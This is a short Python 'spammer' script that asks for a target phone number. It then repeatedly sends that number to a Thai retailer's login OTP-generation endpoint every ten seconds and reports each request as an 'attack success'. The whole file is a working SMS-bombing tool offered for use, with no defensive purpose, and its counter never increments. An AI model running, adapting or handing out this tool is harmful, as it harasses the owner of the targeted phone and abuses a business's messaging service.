import time,requests
import os,sys

print("      |                      _  ")
print("      |  |      _ | / _  |  \ ")
print("      |__| __ |   |/  |__  |  / ")
print("      |  | |__| |__ |\  |__  |_/  ")
print("         | |  |     | \_     | \ KPC\n")
print("Spammer By Kapokcode".center(50))
print(">>> working\n".center(60))

time.sleep(0.03)
desc = ("[*] Description: Tool Spammer Create By KPC\n")
des_c = ("[*] Github : https://github.com/kapokcode\n")
full_desc = desc + des_c
for info in list(full_desc):
    print(info, end="",flush=True)
    time.sleep(0.03)
    
print("\n[*] Ctrl + C  # to exit ")

phone = input("\n[-] Phone Target (Sample 0611233455): ")
n = 0
while True:
    requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phone})
    print(f"[*] Attack Success Target {phone}  Counter {n+1}")
    time.sleep(10)